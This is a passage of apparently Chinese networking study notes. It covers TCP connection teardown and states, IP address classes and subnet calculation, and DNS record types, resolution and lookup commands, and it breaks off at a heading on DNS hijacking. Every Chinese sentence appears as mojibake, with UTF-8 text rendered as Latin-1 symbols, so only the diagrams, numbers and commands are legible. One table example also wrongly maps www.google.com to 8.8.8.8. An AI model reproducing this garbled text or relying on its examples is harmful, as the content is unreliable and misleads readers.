**é˜²æ­¢å¤±æ•ˆçš„è¿æ¥è¯·æ±‚**ï¼š
```
åœºæ™¯ï¼šå®¢æˆ·ç«¯ç¬¬ä¸€ä¸ªSYNåœ¨ç½‘ç»œä¸­å»¶è¿Ÿï¼Œå®¢æˆ·ç«¯é‡å‘SYNå»ºç«‹è¿æ¥å¹¶ä¼ è¾“æ•°æ®åæ–­å¼€ã€‚
å»¶è¿Ÿçš„SYNåˆ°è¾¾æœåŠ¡å™¨ï¼š
- å¦‚æœæ˜¯ä¸¤æ¬¡æ¡æ‰‹ï¼šæœåŠ¡å™¨ä¼šè®¤ä¸ºè¦å»ºç«‹æ–°è¿æ¥ï¼Œæµªè´¹èµ„æº
- ä¸‰æ¬¡æ¡æ‰‹ï¼šæœåŠ¡å™¨å‘é€SYN+ACKåç­‰å¾…å®¢æˆ·ç«¯ACKï¼Œè¶…æ—¶åé‡Šæ”¾èµ„æº
```

#### å››æ¬¡æŒ¥æ‰‹è¿‡ç¨‹

```
å®¢æˆ·ç«¯                                æœåŠ¡å™¨
  |                                    |
  |           ç¬¬ä¸€æ¬¡æŒ¥æ‰‹                |
  |---- FIN=1, seq=u ----------------->| (å®¢æˆ·ç«¯è¯·æ±‚æ–­å¼€)
  |                                    |
  |           ç¬¬äºŒæ¬¡æŒ¥æ‰‹                |
  |<--- ACK=1, seq=v, ack=u+1 ---------| (æœåŠ¡å™¨ç¡®è®¤æ”¶åˆ°)
  |                                    |
  |           ç¬¬ä¸‰æ¬¡æŒ¥æ‰‹                |
  |<--- FIN=1, ACK=1, seq=w, ack=u+1 --| (æœåŠ¡å™¨è¯·æ±‚æ–­å¼€)
  |                                    |
  |           ç¬¬å››æ¬¡æŒ¥æ‰‹                |
  |---- ACK=1, seq=u+1, ack=w+1 ------>| (å®¢æˆ·ç«¯ç¡®è®¤æ–­å¼€)
  |                                    |
            TCPè¿æ¥å®Œå…¨æ–­å¼€
```

**è¯¦ç»†æ­¥éª¤è§£æ**ï¼š

**ç¬¬ä¸€æ¬¡æŒ¥æ‰‹**ï¼š
- å®¢æˆ·ç«¯å‘é€FIN=1ï¼Œseq=u
- å®¢æˆ·ç«¯è¿›å…¥FIN_WAIT_1çŠ¶æ€
- å«ä¹‰ï¼š**"æˆ‘çš„æ•°æ®å‘é€å®Œäº†ï¼Œå¯ä»¥æ–­å¼€è¿æ¥"**

**ç¬¬äºŒæ¬¡æŒ¥æ‰‹**ï¼š
- æœåŠ¡å™¨å›å¤ACK=1ï¼Œseq=vï¼Œack=u+1
- æœåŠ¡å™¨è¿›å…¥CLOSE_WAITçŠ¶æ€ï¼Œå®¢æˆ·ç«¯è¿›å…¥FIN_WAIT_2çŠ¶æ€
- å«ä¹‰ï¼š**"æˆ‘çŸ¥é“ä½ è¦æ–­å¼€ï¼Œä½†æˆ‘å¯èƒ½è¿˜æœ‰æ•°æ®è¦å‘"**

**ç¬¬ä¸‰æ¬¡æŒ¥æ‰‹**ï¼š
- æœåŠ¡å™¨å‘é€FIN=1ï¼ŒACK=1ï¼Œseq=wï¼Œack=u+1
- æœåŠ¡å™¨è¿›å…¥LAST_ACKçŠ¶æ€
- å«ä¹‰ï¼š**"æˆ‘çš„æ•°æ®ä¹Ÿå‘é€å®Œäº†ï¼Œå¯ä»¥æ–­å¼€è¿æ¥"**

**ç¬¬å››æ¬¡æŒ¥æ‰‹**ï¼š
- å®¢æˆ·ç«¯å‘é€ACK=1ï¼Œseq=u+1ï¼Œack=w+1
- å®¢æˆ·ç«¯è¿›å…¥TIME_WAITçŠ¶æ€ï¼ŒæœåŠ¡å™¨è¿›å…¥CLOSEDçŠ¶æ€
- å«ä¹‰ï¼š**"ç¡®è®¤æ–­å¼€è¿æ¥"**

#### ä¸ºä»€ä¹ˆæ˜¯å››æ¬¡æŒ¥æ‰‹ï¼Ÿ

**TCPæ˜¯å…¨åŒå·¥é€šä¿¡**ï¼š
```
å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ï¼šéœ€è¦å•ç‹¬å…³é—­
å®¢æˆ·ç«¯ â† æœåŠ¡å™¨ï¼šéœ€è¦å•ç‹¬å…³é—­

æ‰€ä»¥éœ€è¦ä¸¤å¯¹FIN/ACKï¼Œå…±å››æ¬¡æŒ¥æ‰‹
```

#### TCPçŠ¶æ€è½¬æ¢å›¾

```
CLOSED â†’ SYN_SENT â†’ ESTABLISHED â†’ FIN_WAIT_1 â†’ FIN_WAIT_2 â†’ TIME_WAIT â†’ CLOSED
    â†“        â†“           â†“            â†“           â†“           â†“
  å‘é€SYN  æ”¶åˆ°SYN+ACK  å‘é€ACK     å‘é€FIN    æ”¶åˆ°ACK    æ”¶åˆ°FIN,å‘é€ACK

æœåŠ¡å™¨ç«¯ï¼š
CLOSED â†’ LISTEN â†’ SYN_RCVD â†’ ESTABLISHED â†’ CLOSE_WAIT â†’ LAST_ACK â†’ CLOSED
    â†“      â†“         â†“           â†“            â†“           â†“
  ç›‘å¬   æ”¶åˆ°SYN  å‘é€SYN+ACK  æ”¶åˆ°ACK     æ”¶åˆ°FIN,å‘é€ACK å‘é€FIN
```

### ğŸ’¡ è®°å¿†æŠ€å·§

**ä¸‰æ¬¡æ¡æ‰‹è®°å¿†**ï¼š**"è¯·æ±‚-åŒæ„-ç¡®è®¤"**
- ç¬¬ä¸€æ¬¡ï¼š**"æˆ‘æƒ³è¿æ¥"**ï¼ˆSYNï¼‰
- ç¬¬äºŒæ¬¡ï¼š**"å¯ä»¥è¿æ¥"**ï¼ˆSYN+ACKï¼‰
- ç¬¬ä¸‰æ¬¡ï¼š**"å¼€å§‹è¿æ¥"**ï¼ˆACKï¼‰

**å››æ¬¡æŒ¥æ‰‹è®°å¿†**ï¼š**"æˆ‘è¦èµ°-çŸ¥é“äº†-æˆ‘ä¹Ÿèµ°-å†è§"**
- ç¬¬ä¸€æ¬¡ï¼š**"æˆ‘è¦æ–­å¼€"**ï¼ˆFINï¼‰
- ç¬¬äºŒæ¬¡ï¼š**"çŸ¥é“äº†ï¼Œç­‰æˆ‘å‘å®Œ"**ï¼ˆACKï¼‰
- ç¬¬ä¸‰æ¬¡ï¼š**"æˆ‘ä¹Ÿè¦æ–­å¼€"**ï¼ˆFINï¼‰
- ç¬¬å››æ¬¡ï¼š**"ç¡®è®¤æ–­å¼€"**ï¼ˆACKï¼‰

**æ—¶åºè®°å¿†**ï¼š
- æ¡æ‰‹ï¼š**1-2-3**ï¼ˆå»ºç«‹éœ€è¦ç¡®è®¤ï¼‰
- æŒ¥æ‰‹ï¼š**1-2-3-4**ï¼ˆæ–­å¼€éœ€è¦åŒå‘ï¼‰

### â“ å…¸å‹è€ƒé¢˜

1. **é€‰æ‹©é¢˜**ï¼šTCPä¸‰æ¬¡æ¡æ‰‹çš„ç¬¬äºŒæ¬¡æ¡æ‰‹å‘é€çš„æ ‡å¿—ä½æ˜¯ï¼Ÿ
   - A. SYN  B. ACK  C. SYN+ACK  D. FIN
   - **ç­”æ¡ˆ**ï¼šC

2. **ç®€ç­”é¢˜**ï¼šä¸ºä»€ä¹ˆTCPè¿æ¥å»ºç«‹æ˜¯ä¸‰æ¬¡æ¡æ‰‹è€Œä¸æ˜¯ä¸¤æ¬¡ï¼Ÿ
   - **è¦ç‚¹**ï¼šé˜²æ­¢å¤±æ•ˆè¿æ¥è¯·æ±‚è¢«æœåŠ¡å™¨æ¥å—

3. **åˆ†æé¢˜**ï¼šå®¢æˆ·ç«¯åœ¨TIME_WAITçŠ¶æ€çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ
   - **è¦ç‚¹**ï¼šç¡®ä¿æœ€åçš„ACKèƒ½åˆ°è¾¾æœåŠ¡å™¨ï¼Œé˜²æ­¢ä¸¢å¤±åé‡ä¼ FIN

### âš ï¸ æ˜“é”™ç‚¹

- **æ¡æ‰‹æ¬¡æ•°**ï¼šè®°ä½æ˜¯3æ¬¡æ¡æ‰‹ï¼Œ4æ¬¡æŒ¥æ‰‹ï¼Œä¸è¦æå
- **çŠ¶æ€ç†è§£**ï¼šESTABLISHEDè¡¨ç¤ºè¿æ¥å»ºç«‹ï¼Œä¸æ˜¯è¿æ¥ä¸­
- **TIME_WAIT**ï¼šå®¢æˆ·ç«¯æ–­å¼€åè¦ç­‰å¾…2MSLæ—¶é—´æ‰èƒ½é‡ç”¨ç«¯å£
- **åŠå…³é—­**ï¼šä¸€æ–¹å‘é€FINåªè¡¨ç¤ºä¸å†å‘é€æ•°æ®ï¼Œä»å¯æ¥æ”¶æ•°æ®

---

## 5ï¸âƒ£ IPåœ°å€ä¸å­ç½‘åˆ’åˆ†

### ğŸ¯ æ ¸å¿ƒæ¦‚å¿µ

**IPåœ°å€**æ˜¯ç½‘ç»œä¸­è®¾å¤‡çš„é€»è¾‘åœ°å€ï¼Œ**å­ç½‘åˆ’åˆ†**æ˜¯å°†å¤§ç½‘ç»œåˆ†å‰²æˆå°ç½‘ç»œçš„æŠ€æœ¯ï¼Œ**CIDR**æ˜¯ç°ä»£IPåœ°å€åˆ†é…æ–¹æ³•ã€‚

### ğŸ“– è¯¦ç»†è§£æ

#### IPåœ°å€åˆ†ç±»ï¼ˆä¼ ç»Ÿåˆ†ç±»æ³•ï¼‰

```
â”Œâ”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ç±»åˆ« â”‚    èŒƒå›´      â”‚   é»˜è®¤æ©ç    â”‚  ç½‘ç»œä½æ•°   â”‚   ä¸»æœºä½æ•°   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  A   â”‚ 1-126       â”‚ 255.0.0.0   â”‚     8       â”‚     24      â”‚
â”‚      â”‚ 0xxxxxxx    â”‚ /8          â”‚             â”‚ 1677ä¸‡å°    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  B   â”‚ 128-191     â”‚ 255.255.0.0 â”‚     16      â”‚     16      â”‚
â”‚      â”‚ 10xxxxxx    â”‚ /16         â”‚             â”‚ 6.5ä¸‡å°     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  C   â”‚ 192-223     â”‚ 255.255.255.0â”‚    24       â”‚     8       â”‚
â”‚      â”‚ 110xxxxx    â”‚ /24         â”‚             â”‚ 254å°       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  D   â”‚ 224-239     â”‚ ç»„æ’­åœ°å€     â”‚             â”‚             â”‚
â”‚      â”‚ 1110xxxx    â”‚             â”‚             â”‚             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  E   â”‚ 240-255     â”‚ å®éªŒç”¨       â”‚             â”‚             â”‚
â”‚      â”‚ 1111xxxx    â”‚             â”‚             â”‚             â”‚
â””â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### ç‰¹æ®ŠIPåœ°å€

```
127.0.0.1         â† æœ¬åœ°å›ç¯åœ°å€ï¼ˆlocalhostï¼‰
0.0.0.0           â† è¡¨ç¤ºæ‰€æœ‰ç½‘ç»œ
255.255.255.255   â† å—é™å¹¿æ’­åœ°å€
169.254.x.x       â† é“¾è·¯æœ¬åœ°åœ°å€ï¼ˆAPIPAï¼‰
```

#### ç§æœ‰IPåœ°å€èŒƒå›´

```
Aç±»ç§æœ‰ï¼š10.0.0.0    - 10.255.255.255     (10.0.0.0/8)
Bç±»ç§æœ‰ï¼š172.16.0.0  - 172.31.255.255     (172.16.0.0/12)
Cç±»ç§æœ‰ï¼š192.168.0.0 - 192.168.255.255    (192.168.0.0/16)

ç‰¹ç‚¹ï¼š
âœ… ä¸èƒ½åœ¨å…¬ç½‘è·¯ç”±
âœ… å¯ä»¥é‡å¤ä½¿ç”¨
âœ… éœ€è¦NATè½¬æ¢è®¿é—®å¤–ç½‘
```

#### CIDRï¼ˆæ— ç±»åŸŸé—´è·¯ç”±ï¼‰

**CIDRè¡¨ç¤ºæ³•**ï¼š
```
192.168.1.0/24
    â†“       â†“
   IPåœ°å€  å­ç½‘æ©ç é•¿åº¦

ç­‰ä»·äºï¼š192.168.1.0ï¼Œå­ç½‘æ©ç 255.255.255.0
```

**å­ç½‘æ©ç è®¡ç®—**ï¼š
```
/24 = 255.255.255.0    â† 24ä¸ª1ï¼Œ8ä¸ª0
/25 = 255.255.255.128  â† 25ä¸ª1ï¼Œ7ä¸ª0
/26 = 255.255.255.192  â† 26ä¸ª1ï¼Œ6ä¸ª0
/27 = 255.255.255.224  â† 27ä¸ª1ï¼Œ5ä¸ª0
/28 = 255.255.255.240  â† 28ä¸ª1ï¼Œ4ä¸ª0
/29 = 255.255.255.248  â† 29ä¸ª1ï¼Œ3ä¸ª0
/30 = 255.255.255.252  â† 30ä¸ª1ï¼Œ2ä¸ª0
```

#### å­ç½‘åˆ’åˆ†å®ä¾‹

**ä¾‹é¢˜**ï¼šå°†192.168.1.0/24åˆ’åˆ†æˆ4ä¸ªå­ç½‘

**æ­¥éª¤1ï¼šç¡®å®šéœ€è¦çš„ä¸»æœºä½æ•°**
```
4ä¸ªå­ç½‘éœ€è¦2ä½å­ç½‘ä½ï¼ˆ2Â² = 4ï¼‰
åŸæ¥æ˜¯/24ï¼Œå¢åŠ 2ä½å˜æˆ/26
```

**æ­¥éª¤2ï¼šè®¡ç®—å­ç½‘æ©ç **
```
/26 = 255.255.255.192
```

**æ­¥éª¤3ï¼šè®¡ç®—å„å­ç½‘**
```
å­ç½‘1ï¼š192.168.1.0/26   (192.168.1.0   - 192.168.1.63)
å­ç½‘2ï¼š192.168.1.64/26  (192.168.1.64  - 192.168.1.127)
å­ç½‘3ï¼š192.168.1.128/26 (192.168.1.128 - 192.168.1.191)
å­ç½‘4ï¼š192.168.1.192/26 (192.168.1.192 - 192.168.1.255)
```

**æ­¥éª¤4ï¼šç¡®å®šå¯ç”¨IP**
```
æ¯ä¸ªå­ç½‘ï¼š
- ç½‘ç»œåœ°å€ï¼šç¬¬ä¸€ä¸ªIPï¼ˆä¸å¯ç”¨ï¼‰
- å¹¿æ’­åœ°å€ï¼šæœ€åä¸€ä¸ªIPï¼ˆä¸å¯ç”¨ï¼‰
- å¯ç”¨ä¸»æœºIPï¼šä¸­é—´çš„IPï¼ˆ62ä¸ªï¼‰
```

#### å­ç½‘åˆ’åˆ†å…¬å¼

**é‡è¦å…¬å¼**ï¼š
```
å­ç½‘æ•°é‡ = 2^å€Ÿç”¨ä½æ•°
æ¯ä¸ªå­ç½‘ä¸»æœºæ•° = 2^ä¸»æœºä½æ•° - 2
å¯ç”¨ä¸»æœºæ•° = ä¸»æœºæ•° - ç½‘ç»œåœ°å€ - å¹¿æ’­åœ°å€

ä¾‹å¦‚/26ï¼š
- ä¸»æœºä½æ•° = 32 - 26 = 6ä½
- ä¸»æœºæ•° = 2^6 = 64ä¸ª
- å¯ç”¨ä¸»æœºæ•° = 64 - 2 = 62ä¸ª
```

#### å¿«é€Ÿè®¡ç®—æŠ€å·§

**å­ç½‘é—´éš”è®¡ç®—**ï¼š
```
/25ï¼šé—´éš” = 256 - 128 = 128
/26ï¼šé—´éš” = 256 - 192 = 64
/27ï¼šé—´éš” = 256 - 224 = 32
/28ï¼šé—´éš” = 256 - 240 = 16
/29ï¼šé—´éš” = 256 - 248 = 8
/30ï¼šé—´éš” = 256 - 252 = 4
```

### ğŸ’¡ è®°å¿†æŠ€å·§

**IPåœ°å€åˆ†ç±»è®°å¿†**ï¼š
- **Aç±»**ï¼š**"Army"** â†’ 1-126ï¼ˆè·³è¿‡127æœ¬åœ°å›ç¯ï¼‰
- **Bç±»**ï¼š**"Business"** â†’ 128-191
- **Cç±»**ï¼š**"Customer"** â†’ 192-223

**ç§æœ‰åœ°å€è®°å¿†**ï¼š
- **10å¼€å¤´**ï¼šAç±»ç§æœ‰ï¼ˆæœ€å¤§çš„ç§æœ‰ç½‘ç»œï¼‰
- **172.16å¼€å¤´**ï¼šBç±»ç§æœ‰ï¼ˆä¸­ç­‰ç§æœ‰ç½‘ç»œï¼‰
- **192.168å¼€å¤´**ï¼šCç±»ç§æœ‰ï¼ˆå®¶åº­ç½‘ç»œå¸¸ç”¨ï¼‰

**å­ç½‘æ©ç ä½æ•°è®°å¿†**ï¼š
```
/8,/16,/24  â† ä¼ ç»Ÿåˆ†ç±»ï¼ˆ8çš„å€æ•°ï¼‰
/30         â† ç‚¹å¯¹ç‚¹é“¾è·¯ï¼ˆ2ä¸ªå¯ç”¨IPï¼‰
/32         â† ä¸»æœºè·¯ç”±ï¼ˆ1ä¸ªIPï¼‰
```

### â“ å…¸å‹è€ƒé¢˜

1. **è®¡ç®—é¢˜**ï¼š192.168.10.0/24åˆ†æˆ8ä¸ªå­ç½‘ï¼Œæ¯ä¸ªå­ç½‘çš„æ©ç æ˜¯ï¼Ÿ
   - **è§£ç­”**ï¼š8ä¸ªå­ç½‘éœ€è¦3ä½ï¼ˆ2Â³=8ï¼‰ï¼Œ/24+3=/27ï¼Œæ©ç 255.255.255.224

2. **åˆ¤æ–­é¢˜**ï¼šIPåœ°å€172.16.5.10å±äºBç±»ç§æœ‰åœ°å€
   - **ç­”æ¡ˆ**ï¼šæ­£ç¡®ï¼ˆ172.16.0.0/12æ˜¯Bç±»ç§æœ‰åœ°å€èŒƒå›´ï¼‰

3. **åº”ç”¨é¢˜**ï¼šå…¬å¸æœ‰5ä¸ªéƒ¨é—¨ï¼Œæ¯ä¸ªéƒ¨é—¨éœ€è¦30å°ç”µè„‘ï¼Œå¦‚ä½•åˆ’åˆ†å­ç½‘ï¼Ÿ
   - **è¦ç‚¹**ï¼šéœ€è¦32ä¸ªIPï¼ˆ2âµï¼‰çš„å­ç½‘ï¼Œä½¿ç”¨/27ï¼Œå¯ä»¥åˆ’åˆ†8ä¸ªå­ç½‘

### âš ï¸ æ˜“é”™ç‚¹

- **ä¸»æœºæ•°è®¡ç®—**ï¼šè¦å‡å»ç½‘ç»œåœ°å€å’Œå¹¿æ’­åœ°å€ï¼ˆ-2ï¼‰
- **å­ç½‘ä½æ•°**ï¼šå€Ÿç”¨çš„æ˜¯ä¸»æœºä½ï¼Œä¸æ˜¯ç½‘ç»œä½
- **CIDRè¡¨ç¤º**ï¼š/24è¡¨ç¤ºå‰24ä½æ˜¯ç½‘ç»œä½ï¼Œä¸æ˜¯ä¸»æœºä½
- **ç§æœ‰åœ°å€**ï¼š172å¼€å¤´ä¸å…¨æ˜¯ç§æœ‰ï¼Œåªæœ‰172.16-172.31æ˜¯ç§æœ‰

---

## 6ï¸âƒ£ DNSåŸŸåè§£æ

### ğŸ¯ æ ¸å¿ƒæ¦‚å¿µ

**DNS**ï¼ˆåŸŸåç³»ç»Ÿï¼‰æ˜¯å°†äººç±»å¯è¯»çš„åŸŸåè½¬æ¢ä¸ºIPåœ°å€çš„åˆ†å¸ƒå¼æ•°æ®åº“ç³»ç»Ÿï¼Œé‡‡ç”¨**æ ‘å½¢å±‚æ¬¡ç»“æ„**ã€‚

### ğŸ“– è¯¦ç»†è§£æ

#### DNSç³»ç»Ÿæ¶æ„

```
                     æ ¹åŸŸåæœåŠ¡å™¨ (.)
                           |
        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
        â”‚                â”‚                â”‚
     .com            .org              .cn
   é¡¶çº§åŸŸæœåŠ¡å™¨      é¡¶çº§åŸŸæœåŠ¡å™¨      é¡¶çº§åŸŸæœåŠ¡å™¨
        â”‚                â”‚                â”‚
   â”Œâ”€â”€â”€â”€â”¼â”€â”€â”€â”€â”           â”‚           â”Œâ”€â”€â”€â”€â”¼â”€â”€â”€â”€â”
   â”‚    â”‚    â”‚           â”‚           â”‚    â”‚    â”‚
 google baidu â”‚           â”‚         sina  qq   â”‚
æƒå¨åŸŸåæœåŠ¡å™¨ â”‚           â”‚        æƒå¨åŸŸåæœåŠ¡å™¨â”‚
              â”‚           â”‚                    â”‚
            amazon      wikipedia            taobao
           æƒå¨åŸŸåæœåŠ¡å™¨  æƒå¨åŸŸåæœåŠ¡å™¨      æƒå¨åŸŸåæœåŠ¡å™¨
```

#### DNSè®°å½•ç±»å‹

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ è®°å½•ç±»å‹  â”‚      ä½œç”¨        â”‚          ç¤ºä¾‹            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚    A     â”‚ åŸŸåâ†’IPv4åœ°å€    â”‚ www.google.comâ†’8.8.8.8  â”‚
â”‚   AAAA   â”‚ åŸŸåâ†’IPv6åœ°å€    â”‚ www.google.comâ†’2001::1  â”‚
â”‚   CNAME  â”‚ åŸŸååˆ«å         â”‚ wwwâ†’example.com         â”‚
â”‚    MX    â”‚ é‚®ä»¶æœåŠ¡å™¨       â”‚ example.comâ†’mail.ex.com â”‚
â”‚    NS    â”‚ åŸŸåæœåŠ¡å™¨       â”‚ example.comâ†’ns1.ex.com  â”‚
â”‚   TXT    â”‚ æ–‡æœ¬ä¿¡æ¯         â”‚ ç”¨äºSPFã€DKIMç­‰éªŒè¯     â”‚
â”‚   PTR    â”‚ IPâ†’åŸŸå(åå‘)    â”‚ 8.8.8.8â†’dns.google.com  â”‚
â”‚   SOA    â”‚ åŸŸæƒå¨ä¿¡æ¯       â”‚ åŸŸçš„ç®¡ç†ä¿¡æ¯             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### DNSè§£æè¿‡ç¨‹

**å®Œæ•´è§£ææµç¨‹**ï¼š
```
ç”¨æˆ·è¾“å…¥ www.baidu.com
        â†“
1. æ£€æŸ¥æµè§ˆå™¨ç¼“å­˜ â†’ æœ‰åˆ™è¿”å›
        â†“
2. æ£€æŸ¥æ“ä½œç³»ç»Ÿç¼“å­˜(/etc/hosts) â†’ æœ‰åˆ™è¿”å›
        â†“
3. æœ¬åœ°DNSæœåŠ¡å™¨(é€’å½’æŸ¥è¯¢)
        â†“
4. æœ¬åœ°DNS â†’ æ ¹åŸŸåæœåŠ¡å™¨
   "è¯·é—®.comçš„æœåŠ¡å™¨åœ¨å“ªï¼Ÿ"
        â†“
5. æ ¹æœåŠ¡å™¨å›å¤ï¼š".comåœ¨è¿™äº›æœåŠ¡å™¨..."
        â†“
6. æœ¬åœ°DNS â†’ .comé¡¶çº§åŸŸæœåŠ¡å™¨
   "è¯·é—®baidu.comçš„æœåŠ¡å™¨åœ¨å“ªï¼Ÿ"
        â†“
7. .comæœåŠ¡å™¨å›å¤ï¼š"baidu.comåœ¨è¿™äº›æœåŠ¡å™¨..."
        â†“
8. æœ¬åœ°DNS â†’ baidu.comæƒå¨æœåŠ¡å™¨
   "è¯·é—®www.baidu.comçš„IPæ˜¯å¤šå°‘ï¼Ÿ"
        â†“
9. æƒå¨æœåŠ¡å™¨å›å¤ï¼š"www.baidu.comæ˜¯39.156.69.79"
        â†“
10. æœ¬åœ°DNSå°†ç»“æœè¿”å›ç”¨æˆ·å¹¶ç¼“å­˜
```

#### é€’å½’æŸ¥è¯¢ vs è¿­ä»£æŸ¥è¯¢

**é€’å½’æŸ¥è¯¢**ï¼š
```
å®¢æˆ·ç«¯ â†’ æœ¬åœ°DNSæœåŠ¡å™¨ï¼š"å¸®æˆ‘æŸ¥www.baidu.com"
æœ¬åœ°DNSï¼šæˆ‘æ¥å¸®ä½ æ‰¾åˆ°ç­”æ¡ˆ
å®¢æˆ·ç«¯ â† æœ¬åœ°DNSæœåŠ¡å™¨ï¼š"ç­”æ¡ˆæ˜¯39.156.69.79"

ç‰¹ç‚¹ï¼šå®¢æˆ·ç«¯åªå‘ä¸€æ¬¡è¯·æ±‚ï¼ŒDNSæœåŠ¡å™¨è´Ÿè´£å®Œæ•´æŸ¥æ‰¾
```

**è¿­ä»£æŸ¥è¯¢**ï¼š
```
æœ¬åœ°DNS â†’ æ ¹æœåŠ¡å™¨ï¼š"www.baidu.comåœ¨å“ªï¼Ÿ"
æ ¹æœåŠ¡å™¨ â†’ æœ¬åœ°DNSï¼š"æˆ‘ä¸çŸ¥é“ï¼Œå»é—®.comæœåŠ¡å™¨"

æœ¬åœ°DNS â†’ .comæœåŠ¡å™¨ï¼š"www.baidu.comåœ¨å“ªï¼Ÿ"
.comæœåŠ¡å™¨ â†’ æœ¬åœ°DNSï¼š"æˆ‘ä¸çŸ¥é“ï¼Œå»é—®baidu.comæœåŠ¡å™¨"

æœ¬åœ°DNS â†’ baidu.comæœåŠ¡å™¨ï¼š"www.baidu.comåœ¨å“ªï¼Ÿ"
baidu.comæœåŠ¡å™¨ â†’ æœ¬åœ°DNSï¼š"åœ¨39.156.69.79"

ç‰¹ç‚¹ï¼šæ¯æ¬¡åªè¿”å›ä¸‹ä¸€è·³ä¿¡æ¯ï¼Œéœ€è¦å¤šæ¬¡æŸ¥è¯¢
```

#### DNSç¼“å­˜æœºåˆ¶

**ç¼“å­˜å±‚æ¬¡**ï¼š
```
æµè§ˆå™¨ç¼“å­˜ (1-2åˆ†é’Ÿ)
    â†“
æ“ä½œç³»ç»Ÿç¼“å­˜ (å‡ åˆ†é’Ÿåˆ°å‡ å°æ—¶)
    â†“
æœ¬åœ°DNSæœåŠ¡å™¨ç¼“å­˜ (å‡ å°æ—¶åˆ°å‡ å¤©)
    â†“
æƒå¨DNSæœåŠ¡å™¨ (æ ¹æ®TTLè®¾ç½®)
```

**TTLï¼ˆç”Ÿå­˜æ—¶é—´ï¼‰**ï¼š
```
ä¾‹å¦‚ï¼šbaidu.com. 300 IN A 39.156.69.79
               â†‘
              TTLå€¼ï¼ˆç§’ï¼‰

ä½œç”¨ï¼šæ§åˆ¶ç¼“å­˜æ—¶é—´ï¼Œå¹³è¡¡æ€§èƒ½å’Œå®æ—¶æ€§
```

#### å¸¸è§DNSå‘½ä»¤

**nslookupå‘½ä»¤**ï¼š
```bash
# æŸ¥è¯¢Aè®°å½•
nslookup www.baidu.com

# æŸ¥è¯¢MXè®°å½•
nslookup -type=MX baidu.com

# æŒ‡å®šDNSæœåŠ¡å™¨
nslookup www.baidu.com 8.8.8.8
```

**digå‘½ä»¤**ï¼š
```bash
# åŸºæœ¬æŸ¥è¯¢
dig www.baidu.com

# æŸ¥è¯¢ç‰¹å®šè®°å½•ç±»å‹
dig baidu.com MX

# è¿½è¸ªè§£æè·¯å¾„
dig +trace www.baidu.com

# åå‘è§£æ
dig -x 39.156.69.79
```

#### DNSå®‰å…¨

**DNSæ±¡æŸ“/åŠ«æŒ**ï¼š
